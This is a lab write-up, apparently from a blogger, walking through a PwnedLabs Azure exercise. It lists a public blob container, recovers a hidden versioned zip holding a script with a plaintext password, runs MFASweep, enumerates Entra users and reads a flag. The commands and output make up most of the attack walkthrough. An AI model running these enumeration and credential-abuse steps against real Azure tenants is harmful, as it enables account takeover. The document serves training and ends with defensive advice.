Hi everyone, my name is Vader, and today we’ll be jumping into another awesome lab on the PwnedLabs platform.

In this session, we’re tackling **the Initial Access lab from the Blobs module**, part of the first section of the **MCRTP Bootcamp**. This lab is designed to introduce real-world cloud attack techniques, walk through configurations, and show how a single overlooked blob can become the foothold an attacker needs.

## Initial Enumeration and Blob Discovery

At the start of the lab we are given a site, as a foothold, being curious I checked the source code.

```html

window.devices = { mobile: false, tablet: false } window.site_id = 'Mega Big Tech' window.page_id = 'pg_vBxLB77sc9y3boxQouiYYwpnA' window.pages = [{"path":"Mega Big Tech","id":"pg_vBxLB77sc9y3boxQouiYYwpnA","home":true}]; window.preview = true; </script> <link rel="stylesheet" media="screen" href="[https://mbtwebsite.blob.core.windows.net/$web/static/application-0162b80622a4b825c801f8afcd695b5918649df6f9b26eb012974f9b00a777c5.css](view-source:https://mbtwebsite.blob.core.windows.net/$web/static/application-0162b80622a4b825c801f8afcd695b5918649df6f9b26eb012974f9b00a777c5.css)"><link rel="stylesheet" href="[https://mbtwebsite.blob.core.windows.net/$web/static/css](view-source:https://mbtwebsite.blob.core.windows.net/$web/static/css)" media="all"> <script type="text/javascript" charset="UTF-8" src="[https://mbtwebsite.blob.core.windows.net/$web/static/common.js.download](view-source:https://mbtwebsite.blob.core.windows.net/$web/static/common.js.download)"></script><script type="text/javascript" charset="UTF-8" src="[https://mbtwebsite.blob.core.windows.net/$web/static/util.js.download](view-source:https://mbtwebsite.blob.core.windows.net/$web/static/util.js.download)"></script></head><body class="siter-ready">

```

This appears to be fetching content from an Azure Blob. 


## Azure Blobs and Forgotten Zip Files

An Azure blob is typically used for storing binary, static and other files. It is the equivalent to the S3 Bucket on AWS. Being that the name of the lab had to do with this blob storage. I investigated how to list the contents of the bucket. You can look at the various request types here to interface with the container with the browser.

https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=microsoft-entra-id#uri-parameters


The command is something like this:

```
https://storagename.blob.core.windows.net/containername?restype=container&comp=list
```

So replacing it with our case gives us: 
```
https://mbtwebsite.blob.core.windows.net/$web/?restype=container&comp=list
```

However, when we investigate the following site, we get a bunch of static content, and not the useful kind:

![Static content listing](https://i.imgur.com/4X9dZSm.png)
Fortunately our journey isn't over yet, as there does exist another way to list the contents of the blob through versioning. Versioning allows several versions of the same blob to exist on the container. So equipped with this knowledge, I used curl to list the contents of the directory and used versioning to list files that were not immediately accessible. 

```bash
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions
```

This returns quite a bit of data, however, but sifting through it yields a zip file. 
```
---snip---
/></Blob><Blob><Name>scripts-transfer.zip</Name><VersionId>2025-08-07T21:08:03.6678148Z</VersionId><  
Properties><Creation-Time>Thu, 07 Aug 2025 21:08:03 GMT</Creation-Time>
---snip---
```

We are still not done ,however, in order to download it we will need the version ID in the curl command. So let's download it and see what's inside:
```
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z' --output scripts-transfer.zip
```

After unzipping the archive, we are greeted with a PS1 file with hardcoded credentials.
```
Import-Module MSAL.PS

# Username: marcus@megabigtech.com
# Password: TheEagles12345!

# Use Microsoft's public Azure PowerShell client ID
$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
$TenantId = "common"  # Or use your actual tenant ID
$Scopes   = @("https://graph.microsoft.com/.default")

# Device code login (supports MFA)
$TokenResponse = Get-MsalToken -ClientId $ClientId -TenantId $TenantId -Scopes $Scopes -DeviceCode

# Use the access token in Graph API call
$AccessToken = $TokenResponse.AccessToken
$GraphApiUrl = "https://graph.microsoft.com/v1.0/users?`$select=displayName,userPrincipalName"

$headers = @{
    "Authorization" = "Bearer $AccessToken"
    "Content-Type"  = "application/json"
}

$response = Invoke-RestMethod -Uri $GraphApiUrl -Headers $headers -Method Get

# Show formatted output
$response.value | Format-Table displayName, userPrincipalName
```

This is big as we could definitely use this in order to find MFA enablement gaps and other activities. So using MFASweep, we can do just that.

```powershell
ps> . ./MFASweep.ps1
ps> Invoke-MFASweep -Username marcus@megabigtech.com -Password 'TheEagles12345!'  
-----------------------------------snip------------------------------------------
  
######### SINGLE FACTOR ACCESS RESULTS #########  
Microsoft Graph API                  | YES  
Microsoft Service Management API     | YES  
M365 w/ Windows UA                   | NO  
M365 w/ Linux UA                     | NO  
M365 w/ MacOS UA                     | NO  
M365 w/ Android UA                   | NO  
M365 w/ iPhone UA                    | NO  
M365 w/ Windows Phone UA             | NO  
Exchange Web Services (BASIC Auth)   | NO  
Active Sync (BASIC Auth)             | NO  

----------------------------------snip-------------------------------------------


```

## Getting a Foothold

As you can see, we can access Microsoft Graph API and the Service Management API. These are used to enumerate and manipulate Azure AD and Azure resource configurations, and escalate privileges.  But this access gives us another ability, the ability to find a foothold in our Azure environment.  We can use the script for this as it is the most simple way to accomplish what we need. 

_Note: You may need to install MS.AL for this part as well as the AZ module in powershell._

First we need to login as our compromised user using the az cli by running the script 
```

~ /workspace # ./entra_users.ps1
To sign in, use a web browser to open the page https:  
//microsoft.com/devicelogin and enter the code NOPE to authenticate.

```

We then enter the code and type in our compromised users credentials:

![Static content listing](https://i.imgur.com/1moqbJF.png)
From there, the list of users popped up and I had a foothold. 
```
PS /home/vader> ./entra_users.ps1                                                                                   
To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code E5BV93HKM to authenticate.

displayName                                                 userPrincipalName
-----------                                                 -----------------
Akari Fukimo                                                Akari.Fukimo@megabigtech.com
Akira Suzuki                                                Akira.Suzuki@megabigtech.com
Angelina Lee                                                alee@megabigtech.com
Alex Rivera                                                 alex.rivera@megabigtech.com
Alexandra Wu                                                Alexandra.Wu@megabigtech.com
Alice Garcia                                                Alice.Garcia@megabigtech.com
Alice Lopez                                                 Alice.Lopez@megabigtech.com
Amelia Jones                                                Amelia.Jones@megabigtech.com
Arturo Morales                                              amorales@megabigtech.com
Annette Palmer                                              annette.palmer@megabigtech.com
Anthony Diaz                                                Anthony.Diaz@megabigtech.com
Archive User                                                archive@megabigtech.com
Arnold Gladestone                                           Arnold.Gladestone@megabigtech.com
Ashraf Daher                                                Ashraf.Daher@megabigtech.com
Audit                                                       audit@megabigtech.com
Automation account                                          automation@megabigtech.com
Azure Service Firewall Cloudshell User                      azsrvfw-cloudshelluser@megabigtech.com
Backups Admin                                               backupsadmin@megabigtech.com
Bruce                                                       bruce@megabigtech.com
Budi Setiawan                                               Budi.Setiawan@megabigtech.com
Carlos Alcobia                                              Carlos.Alcobia@megabigtech.com
Caroline Jenkins                                            Caroline.Jenkins@megabigtech.com
Clara Miller                                                Clara.Miller@megabigtech.com
Daiki Hiroko                                                Daiki.Hiroko@megabigtech.com
dbuser                                                      dbuser@megabigtech.com
Edrian Taylor                                               Edrian.Taylor@megabigtech.com
Edrian Munoz                                                edrian@megabigtech.com
Elena Georgiou                                              Elena.Georgiou@megabigtech.com
Entra Connect                                               Entra.Connect@megabigtech.com
Josh Harvey (Consultant)                                    ext.josh.harvey@megabigtech.com
Felipe Garcia                                               Felipe.Garcia@megabigtech.com
Felix Schneider                                             Felix.Schneider@megabigtech.com
Filip Jodoin                                                filip@megabigtech.com
Finance Team                                                FinanceTeam@megabigtech.com
Guy Tremblay                                                gtremblay_admin_protonmail.com#EXT#@megabigtech.onmicr…
Hana Takahashi                                              Hana.Takahashi@megabigtech.com
Ian Austin                                                  Ian.Austin@megabigtech.com
Ingrid Johansen                                             ijohansen@megabigtech.com
Imane Batma                                                 Imane.Batma@megabigtech.com
Jack Donnely                                                Jack.Donnely@megabigtech.onmicrosoft.com
James Brandt                                                james.brandt@international-am.com
James Johnson                                               James.Johnson@megabigtech.com
James Sanchez                                               James.Sanchez@megabigtech.com
Jeff Armstrong                                              Jeff.Armstrong@megabigtech.com
Jordan Kim                                                  jordan.kim@megabigtech.com
Jose Rodríguez                                              Jose.Rodriguez@megabigtech.com
Kasper Fjellstad                                            Kasper.Fjellstad@megabigtech.com
Keith Cole                                                  keith.cole@megabigtech.com
Laura Benitez                                               l.benitez@megabigtech.com
Laura Benitez (Admin)                                       laura_adm@megabigtech.com
Liana Howe                                                  liana.howe@megabigtech.com
Lina Meier                                                  Lina.Meier@megabigtech.com
Lindsey Miller                                              Lindsey.Miller@megabigtech.com
Linnea Solberg                                              Linnea.Solberg@megabigtech.com
Low Privilege Filip                                         lowpriv-filip@megabigtech.com
Luca Rossi                                                  luca.rossi@megabigtech.com
Marcus Hutch                                                marcus@megabigtech.com
Mark Lantern                                                mark.lantern@megabigtech.com
Matteus Lundgren                                            matteus@megabigtech.com
Michael Sparks                                              Michael.Sparks@megabigtech.com
Michelle Stuart                                             Michelle.Stuart@megabigtech.com
Mike Hernandez                                              Mike.Hernandez@megabigtech.com
Mike Jones                                                  Mike.Jones@megabigtech.com
Mike Torres                                                 Mike.Torres@megabigtech.com
Monica Turner                                               Monica.Turner@megabigtech.com
Mike Smith                                                  msmith@megabigtech.com
Natasha long                                                natasha.long@megabigtech.com
Noah Lopez                                                  Noah.Lopez@megabigtech.com
Noah Sanchez                                                Noah.Sanchez@megabigtech.com
Oliver Smith                                                Oliver.Smith@megabigtech.com
Oliver Cooper                                               oliverc@megabigtech.com
Olivia Perez                                                Olivia.Perez@megabigtech.com
Patricia                                                    patricia@megabigtech.com
Paul Jones                                                  Paul.Jones@megabigtech.com
Peter Parker                                                Peter.Parker@megabigtech.com
Rohit Agarwal                                               Rohit.Agarwal@megabigtech.com
Rohit Kumar                                                 Rohit.Kumar@megabigtech.com
Ryan Lin                                                    ryan.lin@megabigtech.com
Sam Olsson                                                  Sam.Olsson@megabigtech.com
Sam Patel                                                   sam.patel@megabigtech.com
Samantha Shade                                              Samantha.Shade@megabigtech.com
Security User                                               security-user@megabigtech.com
Seline Diaz                                                 Seline.Diaz@megabigtech.com
Serene Hall                                                 serene@megabigtech.com
serveruser                                                  serveruser@megabigtech.com
Stan Lee                                                    stan.lee@megabigtech.com
Sunita Williams                                             Sunita.Williams@megabigtech.com
Sunita Williams (Admin)                                     sunita_adm@megabigtech.com
International Asset Management (Mega Big Tech MSSP Support) support@international-am.com
Tim Cooke                                                   tim.cooke@megabigtech.com
User Manager                                                user.manager@megabigtech.com
William Martinez                                            William.Martinez@megabigtech.com
William Smith                                               William.Smith@megabigtech.com
Yuki Tanaka                                                 yuki.tanaka@megabigtech.com
Yumi Nakamura                                               Yumi.Nakamura@megabigtech.com

```

From these users, we are able to identify our own `marcus`, so next let's login as them.

```
ps> Connect-AzAccount  
Please select the account you want to login with.  
  
Retrieving subscriptions for the selection...  
  
[Announcements]  
With the new Azure PowerShell login experience, you can select the subscription you want to use more easily. Learn more about it and its configurati  
on at https://go.microsoft.com/fwlink/?linkid=2271909.  
  
If you encounter any problem, please open an issue at: https://aka.ms/azpsissue  
  
Subscription name     Tenant  
-----------------     ------  
Mega Big Tech Default Default Directory
```

Now we are are Marcus! Let's list the signed in users. 

```
ps> Get-AzADUser -SignedIn  
  
AccountEnabled                  :    
AgeGroup                        :    
ApproximateLastSignInDateTime   :    
BusinessPhone                   : {}  
City                            :    
CompanyName                     :    
ComplianceExpirationDateTime    :    
ConsentProvidedForMinor         :    
Country                         :    
CreatedDateTime                 :    
CreationType                    :    
DeletedDateTime                 :    
Department                      :    
DeviceVersion                   :    
DisplayName                     : Marcus Hutch  
EmployeeHireDate                :    
EmployeeId                      :    
EmployeeOrgData                 : {  
                                 }  
EmployeeType                    :    
ExternalUserState               :    
ExternalUserStateChangeDateTime :    
FaxNumber                       :    
GivenName                       : Marcus  
Id                              : 41c178d3-c246-4c00-98f0-8113bd631676  
Identity                        :    
ImAddress                       :    
IsResourceAccount               :    
JobTitle                        : Flag: REDACTED  
LastPasswordChangeDateTime      :
```

And the flag is in the JobTitle! 

## Conclusion 

This lab teaches you all about the AZ cli, blob storage and versioning and the dangers of leaving a blob open. Make sure to 
- _Secure your blobs_: By default this is done for you, but still check if your blob is unsecured.  
-  _Dont store credentials in files_: This one is a nobrainer but using this is asking for trouble. 
- _Use multi factor authentication for all services:_ If there wasn't an MFA enablement gap, we couldn't do anything as an attacker. 
Overall, this was a great lab, big thanks to egre55 for making it. 
